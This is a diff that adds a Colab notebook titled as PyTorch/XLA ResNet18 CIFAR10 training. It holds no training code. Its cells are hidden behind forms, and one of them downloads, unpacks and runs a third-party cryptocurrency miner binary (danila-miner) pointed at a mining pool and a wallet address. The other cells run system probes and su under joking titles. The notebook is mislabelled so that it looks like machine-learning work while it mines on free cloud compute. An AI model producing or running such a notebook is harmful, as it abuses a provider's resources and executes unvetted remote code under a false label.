@@ -1,0 +1,86 @@
+{
+  "nbformat": 4,
+  "nbformat_minor": 0,
+  "metadata": {
+    "colab": {
+      "name": "PyTorch/XLA ResNet18/CIFAR10 Training",
+      "provenance": [],
+      "collapsed_sections": [],
+      "machine_shape": "hm",
+      "include_colab_link": true
+    },
+    "kernelspec": {
+      "name": "python3",
+      "display_name": "Python 3"
+    },
+    "accelerator": "TPU"
+  },
+  "cells": [
+    {
+      "cell_type": "markdown",
+      "metadata": {
+        "id": "view-in-github",
+        "colab_type": "text"
+      },
+      "source": [
+        "<a href=\"https://colab.research.google.com/github/Testdrive345/codeX/blob/main/contrib/colab/colabX\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
+      ]
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "#@title 40 core cpu script 3 click only🤡🤡 { form-width: \"30px\" }\n",
+        "! lscpu"
+      ],
+      "metadata": {
+        "id": "6xArUhb44Ftk",
+        "cellView": "form"
+      },
+      "execution_count": null,
+      "outputs": []
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "#@title direct mining code ton\n",
+        "! wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz\n",
+        "\n",
+        "! tar xf danila-miner-2.3.1-ubuntu-bionic.tar.gz\n",
+        "\n",
+        "! ./danila-miner run https://server1.whalestonpool.com EQCyG6gKLaDdKtbSv_XxDsCMLhYPu8LNghNXNIgSZFITU152"
+      ],
+      "metadata": {
+        "cellView": "form",
+        "id": "FHP_1EtNFkbI"
+      },
+      "execution_count": null,
+      "outputs": []
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "#@title long run script\n",
+        "! su"
+      ],
+      "metadata": {
+        "cellView": "form",
+        "id": "xg3mfJfpgjUt"
+      },
+      "execution_count": null,
+      "outputs": []
+    },
+    {
+      "cell_type": "code",
+      "source": [
+        "#@title 3 click t-4 script 100% { form-width: \"20px\" }\n",
+        "! nvidia-smi"
+      ],
+      "metadata": {
+        "cellView": "form",
+        "id": "aivPmeRLFAU6"
+      },
+      "execution_count": null,
+      "outputs": []
+    }
+  ]
+}
